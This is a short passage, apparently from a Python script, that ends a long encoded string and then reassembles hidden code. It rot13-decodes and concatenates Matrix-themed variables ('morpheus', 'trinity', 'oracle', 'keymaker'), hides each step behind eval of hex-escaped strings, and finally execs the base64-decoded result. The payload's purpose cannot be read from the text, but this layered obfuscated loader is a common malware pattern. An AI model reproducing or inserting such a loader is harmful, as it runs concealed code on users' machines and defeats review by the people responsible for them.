AmAprQLmKUt2BIk4AwyprQWyKUt3AIk4AzIprQL4KUt2AIk4AmuprQMwKUt2BIk4AwMprQp5KUtlBSk4AzMprQplKUt2ZIk4AwAprQMwKUt2AIk4ZwyprQV5WlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AzWprQL1KUt3BIk4AzEprQLkKUt2Lyk4AwIprQplKUtlZSk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXDcyqzSfXTAioKOcoTHbrzkcLv5xMJAioKOlMKAmXTWup2H2AP5vAwExMJAiMTHbMKMuoPtaKUt2MIk4AwIprQMzWlxcXFjaCUA0pzyhMm4aYPqyrTIwWlxcPt=='
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))